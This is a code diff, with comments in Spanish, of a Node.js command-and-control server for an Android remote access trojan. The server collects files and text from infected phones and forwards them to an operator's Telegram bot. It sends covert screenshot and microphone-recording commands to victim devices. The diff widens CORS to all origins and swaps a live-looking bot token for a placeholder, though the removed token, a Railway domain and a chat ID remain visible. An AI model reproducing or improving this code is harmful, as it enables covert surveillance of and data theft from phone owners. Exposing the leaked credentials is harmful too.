@@ -1,5 +1,5 @@
-// RAT C2 Server - Lógica Original, Seguro, y Ruteo de Socket.IO Corregido
-// Utiliza la ruta '/ws' para el Socket.IO para evitar el error 404 en Railway.
+// RAT C2 Server - Versión final con lógica completa, seguridad CORS y base route.
+// Esta configuración garantiza que Socket.IO acepte peticiones desde cualquier origen.
 
 const express = require('express'),
     http = require('http'),
@@ -13,13 +13,13 @@ const express = require('express'),
 // ==================================================================
 
 // 1. PEGA TU TOKEN DE TELEGRAM AQUÍ
-const MANUAL_TOKEN = "8379870959:AAG35f93yFwWw5Qh-O-8M1fHNxMxAPPQ7J8"; // <-- Asegúrate de que este es tu token real
+const MANUAL_TOKEN = "PEGAR_TU_TOKEN_AQUI"; 
 
 // 2. PEGA TU DOMINIO DE RAILWAY AQUÍ (Sin barra al final)
-const MANUAL_DOMAIN = "https://ratserver-production-96a6.up.railway.app"; // <-- Asegúrate de que este es tu dominio real
+const MANUAL_DOMAIN = "https://ratserver-production-96a6.up.railway.app"; 
 
 // 3. PEGA TU ID DE CHAT DE TELEGRAM AQUÍ
-const MANUAL_CHAT_ID = "6775348523"; // <-- Tu ID
+const MANUAL_CHAT_ID = "6775348523";
 
 // ==================================================================
 
@@ -33,18 +33,21 @@ if (MANUAL_TOKEN.includes("PEGAR") || MANUAL_CHAT_ID.includes("PEGAR")) {
 const FILE_DIR = 'file';
 if (!fs.existsSync(FILE_DIR)) try { fs.mkdirSync(FILE_DIR); } catch (e) {}
 
-// Inicialización del Bot (Se mantiene fuera del try/catch si el token ya funciona)
+// Inicialización del Bot 
 const bot = new TelegramBot(MANUAL_TOKEN.trim(), { polling: true });
 console.log("[TELEGRAM] Bot inicializado correctamente.");
-
 
 const app = express();
 const server = http.createServer(app);
 
-// 🔑 CAMBIO CRÍTICO: Ruteo de Socket.IO a '/ws'
+// 🔑 CAMBIO CRÍTICO FINAL: CORS configurado y sin ruta explícita.
 const io = new Server(server, {
-    path: '/ws' // Socket.IO ahora se servirá en TU_DOMINIO/ws
-});
+    // Permite CORS para todos los orígenes, crucial para la conectividad en hosts externos.
+    cors: {
+        origin: "*", 
+        methods: ["GET", "POST"]
+    }
+}); 
 
 app.use(express.json());
 app.use(express.static('HTML'));
@@ -64,7 +67,6 @@ const upload = multer({ storage: storage });
 // --- Rutas HTTP (Entrada de datos desde Android) ---
 
 app.post('/upload', upload.single('file'), (req, res) => {
-    // ... (El resto de la lógica HTTP permanece igual)
     const deviceId = req.headers['currentTarget'];
     if (deviceId && connectedDevices.get(deviceId)) {
         bot.sendMessage(MANUAL_CHAT_ID, 
@@ -76,7 +78,6 @@ app.post('/upload', upload.single('file'), (req, res) => {
 });
 
 app.post('/text', (req, res) => {
-    // ... (El resto de la lógica HTTP permanece igual)
     const deviceId = req.headers['currentTarget'];
     if (deviceId && connectedDevices.get(deviceId)) {
         bot.sendMessage(MANUAL_CHAT_ID, 
@@ -90,7 +91,6 @@ app.post('/text', (req, res) => {
 // --- Lógica Socket.IO (Conexión Android) ---
 
 io.on('connection', socket => {
-    // ... (Lógica de conexión, desconexión y comandos Socket.IO)
     const h = socket.handshake.headers;
     const deviceId = h['currentTarget'];
     const model = h['model'];
@@ -125,7 +125,6 @@ io.on('connection', socket => {
 // --- Lógica del Bot (Permanece igual) ---
 
 bot.on('message', async msg => {
-    // ... (El resto de la lógica del bot permanece igual, solo para el admin)
     const chatId = msg.chat.id;
     const text = msg.text;
 
@@ -134,7 +133,6 @@ bot.on('message', async msg => {
     // SEGURIDAD: Solo tú puedes usar el bot
     if (String(chatId) !== String(MANUAL_CHAT_ID)) return;
 
-    // 1. Menú Principal
     if (text === '/start' || text === '✯ 𝙱𝚊𝚌𝚔 𝚝𝚘 𝚖𝚊𝚒𝚗 𝚖𝚎𝚗𝚞 ✯') {
         currentActions.delete(chatId); 
         selectedDevice.delete(chatId); 
@@ -150,7 +148,7 @@ bot.on('message', async msg => {
             }
         );
     } 
-    // 2. Listar Dispositivos
+
     else if (text === '✯ 𝙳𝚎𝚟𝚒𝚌𝚎𝚜 ✯') {
          if (connectedDevices.size === 0) {
             return bot.sendMessage(chatId, 'No hay dispositivos conectados.');
@@ -165,7 +163,6 @@ bot.on('message', async msg => {
         });
     }
 
-    // 3. Menú de Acciones
     else if (text === '✯ 𝙰𝚌𝚝𝚒𝚘𝚗 ✯') {
         const keyboard = [
             ['✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯', '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯'],
@@ -179,7 +176,6 @@ bot.on('message', async msg => {
         });
     }
 
-    // 4. Lógica de Selección de Dispositivo
     else {
         let targetId = null;
         connectedDevices.forEach((dev, id) => {
@@ -192,11 +188,9 @@ bot.on('message', async msg => {
             return;
         }
 
-        // 5. Ejecución de Comandos
         const currentTargetId = selectedDevice.get(chatId);
         const device = connectedDevices.get(currentTargetId);
         
-        // Comandos Directos
         if (text === '✯ 𝚂𝚌𝚛𝚎𝚎𝚗𝚜𝚑𝚘𝚝 ✯') {
             if (device) {
                 device.socket.emit('commend', 'screenshot');
@@ -218,7 +212,6 @@ bot.on('message', async msg => {
             }
         }
         
-        // Comandos con Input
         else if (text === '✯ 𝙼𝚒𝚌𝚛𝚘𝚙𝚑𝚘𝚗𝚎 ✯') {
             if (device) {
                 currentActions.set(chatId, 'await_mic_duration');
@@ -232,7 +225,6 @@ bot.on('message', async msg => {
             }
         }
 
-        // 6. Manejo de Inputs
         else if (currentActions.get(chatId) === 'await_mic_duration') {
             if (device && !isNaN(text)) {
                 device.socket.emit('microphone', { duration: parseInt(text) });
